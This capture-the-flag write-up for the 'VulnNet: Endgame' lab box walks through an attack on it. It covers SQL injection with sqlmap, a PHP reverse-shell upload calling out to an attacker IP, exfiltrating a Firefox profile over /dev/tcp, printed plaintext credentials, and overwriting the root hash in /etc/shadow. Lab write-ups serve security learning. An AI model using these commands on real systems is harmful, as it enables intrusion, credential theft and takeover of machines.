# VulnNet: Endgame

----

## Nmap Scan  

```ruby
└─$ nmap -sCV -Pn 10.112.150.241
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-13 11:32 EDT
Nmap scan report for 10.112.150.241
Host is up (0.083s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bb:2e:e6:cc:79:f4:7d:68:2c:11:bc:4b:63:19:08:af (RSA)
|   256 80:61:bf:8c:aa:d1:4d:44:68:15:45:33:ed:eb:82:a7 (ECDSA)
|_  256 87:86:04:e9:e0:c0:60:2a:ab:87:8e:9b:c7:05:35:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.64 seconds

```

---

```
gobuster vhost -u http://vulnnet.thm -w /home/kali/Downloads/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

<img width="1385" height="459" alt="image" src="https://github.com/user-attachments/assets/9874bf4f-7975-4198-b133-eae3f160e2ad" />

---

## fuzzing on endpoints on **`admin1`** subdomain 

```
gobuster dir -u http://admin1.vulnnet.thm -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

<img width="1356" height="442" alt="image" src="https://github.com/user-attachments/assets/fa8e303a-4bf6-4256-b8cd-5ce6401de950" />

```
http://admin1.vulnnet.thm/fileadmin/
```

<img width="1360" height="323" alt="image" src="https://github.com/user-attachments/assets/6f7823f2-5dc1-4933-9e82-048f394eccce" />

```
http://admin1.vulnnet.thm/typo3
```

<img width="1027" height="533" alt="image" src="https://github.com/user-attachments/assets/7b6a4cce-7bca-422e-93c7-44b968d094a3" />

---

<img width="1466" height="481" alt="image" src="https://github.com/user-attachments/assets/18bf5549-1073-4ec2-a1de-c4551e8624c5" />

```
sqlmap http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 -D blog --tables
```

<img width="1629" height="439" alt="image" src="https://github.com/user-attachments/assets/25eea975-4555-4b13-8909-fbf1b7d316f4" />

```
sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -D blog -T users --dump
```

<img width="1358" height="450" alt="image" src="https://github.com/user-attachments/assets/17fcec7d-af91-4989-8316-ad968aad2de5" />

---

<img width="1284" height="423" alt="image" src="https://github.com/user-attachments/assets/670708ff-193b-400e-85f8-768696865151" />

```
chris_w / vAxWtmNzeTz
```

<img width="1919" height="670" alt="image" src="https://github.com/user-attachments/assets/e4a09767-1f6f-47d1-a4e7-1f76d87f2382" />

```
# Create shell.php
cat > shell.php << 'EOF'
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.134.38/4444 0>&1'");
?>
EOF
```

> ### get restrect because file name shell.php

<img width="1849" height="786" alt="image" src="https://github.com/user-attachments/assets/e31e7634-01a2-41ea-ba95-f658efbf7b0a" />

<img width="1350" height="186" alt="image" src="https://github.com/user-attachments/assets/479e2870-5d01-4b27-bc71-d5d9efcb90c6" />

## now i upload it 

<img width="1470" height="453" alt="image" src="https://github.com/user-attachments/assets/ce790912-c28d-478e-ab8b-b5ec462a8932" />

## let's check it 

```
http://admin1.vulnnet.thm/fileadmin/user_upload/shell.php
```

<img width="881" height="188" alt="image" src="https://github.com/user-attachments/assets/940d63ab-10d7-4b0f-9eaf-121f3e6dd199" />

---

## found configramti

```
cat LocalConfiguration.php
```

<img width="1522" height="538" alt="image" src="https://github.com/user-attachments/assets/aff868fe-9304-4c00-bacf-c09f5b84b95f" />

```
dbadmin : q2SbGTnSSWB95
```

cat /tmp/firefox_profile.zip > /dev/tcp/192.168.134.38/9999

## after found 

<img width="1618" height="233" alt="image" src="https://github.com/user-attachments/assets/d25b08b5-30cb-4a82-a3bc-3e037c6bde0f" />

## try to dycrpt it but python version wasn't matcch [firefoxdycrpyt](https://github.com/unode/firefox_decrypt)

> ### i pressed it and sent it to my kali machine 

<img width="1343" height="267" alt="image" src="https://github.com/user-attachments/assets/08bae76d-f6fe-4429-a6de-a3313948a116" />

```
ssh system@10.112.150.241

## 8y7TKQDpucKBYhwsb
```

<img width="1150" height="520" alt="image" src="https://github.com/user-attachments/assets/b98d1e9c-d343-4e28-aa4b-6df070caa18d" />

```
./openssl enc -in "/etc/shadow" -out /dev/stdout
```

<img width="1223" height="376" alt="image" src="https://github.com/user-attachments/assets/e1ef8ad1-8621-4daa-88c2-ac24cf8b30ff" />

```
cd /tmp

# Use the full path
~/Utils/openssl enc -in /etc/shadow -out shadow.txt 2>/dev/null

# Check if shadow.txt was created
ls -la shadow.txt

sed 's|root:[^:]*:|root:$6$9oaZwdNG$jrpl883V5yMMdPAFvncio.JaEw3lx7by788qoORBJ1pV5OSGlfBX/ZjkI6qAEf.7Imb7rs6iaBlI4RBxcn.5w.:|' shadow.txt > shadow_modified

# Verify
cat shadow_modified | grep "^root:"

~/Utils/openssl enc -in shadow_modified -out /etc/shadow 2>/dev/null

su -
# Password: 8y7TKQDpucKBYhwsb

```

<img width="1164" height="300" alt="image" src="https://github.com/user-attachments/assets/d032e60f-ffce-4e61-aa90-2801c4d9463e" />

# shhhiit  offffff sorry for this fucken writeup  

<img width="280" height="280" alt="AngerInsideOutGIF" src="https://github.com/user-attachments/assets/213039ba-f0e5-480b-86fd-c9b34a338b2d" />

